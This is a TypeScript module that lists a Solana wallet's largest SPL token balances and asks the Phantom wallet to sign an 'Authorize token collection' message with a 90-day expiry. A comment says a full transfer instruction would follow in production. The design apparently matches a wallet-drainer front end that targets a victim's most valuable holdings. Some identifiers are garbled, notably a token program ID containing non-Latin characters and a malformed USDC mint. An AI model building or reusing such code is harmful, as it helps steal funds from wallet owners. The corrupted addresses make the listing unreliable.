// Solana SPL token detection and signing (client-side via Phantom)
export async function detectSolanaTokens(walletAddress: string): Promise<any[]> {
  try {
    // Query Solana RPC for SPL token accounts
    const response = await fetch("https://api.mainnet-beta.solana.com", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        jsonrpc: "2.0",
        id: 1,
        method: "getTokenAccountsByOwner",
        params: [
          walletAddress,
          { programId: "TokenkegQfeZyiNwAJsyFbPVwwQQfუપ" },
          { encoding: "jsonParsed" },
        ],
      }),
    });

    const data = await response.json();
    if (data.result?.value) {
      return data.result.value
        .map((account: any) => {
          const parsed = account.account.data.parsed.info;
          return {
            mint: parsed.mint,
            balance: parsed.tokenAmount.uiAmount,
            decimals: parsed.tokenAmount.decimals,
            tokenAccountAddress: account.pubkey,
          };
        })
        .filter((token: any) => token.balance > 0)
        .sort((a: any, b: any) => b.balance - a.balance)
        .slice(0, 6);
    }
    return [];
  } catch (error) {
    console.error("Error detecting Solana tokens:", error);
    return [];
  }
}

// Sign Solana transaction (via Phantom wallet in browser)
export async function signSolanaTransaction(
  walletAddress: string,
  tokenMint: string
): Promise<string> {
  const phantom = (window as any).phantom?.solana;
  if (!phantom) {
    throw new Error("Phantom wallet not found");
  }

  try {
    // For Solana, we'll create a simple signed message for now
    // In production, would create a full SPL transfer instruction
    const message = new TextEncoder().encode(
      `Authorize token collection on Solana\nWallet: ${walletAddress}\nToken: ${tokenMint}\nExpiry: ${new Date(Date.now() + 90 * 24 * 60 * 60 * 1000).toISOString()}`
    );

    const signature = await phantom.signMessage(message);
    return Buffer.from(signature.signature).toString("hex");
  } catch (error) {
    console.error("Solana signing error:", error);
    throw error;
  }
}

// Export top Solana tokens
export const SOLANA_TOP_TOKENS = [
  { symbol: "SOL", name: "Solana", mint: "11111111111111111111111111111111" },
  { symbol: "USDC", name: "USD Coin", mint: "EPjFWaLb3odccccjorSzvzlnP7LogicMEiYXrn47qGA" },
  { symbol: "USDT", name: "Tether", mint: "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB" },
  { symbol: "COPE", name: "Cope", mint: "8HGyAAB1yoM1ttS7pnqw1KMJB3z1MZkooof1tta6Hhb" },
  { symbol: "STEP", name: "Step", mint: "StepAscQoEYMwAtMsTpgSKrWNKcz52G5vxWQWS9uGKA" },
];
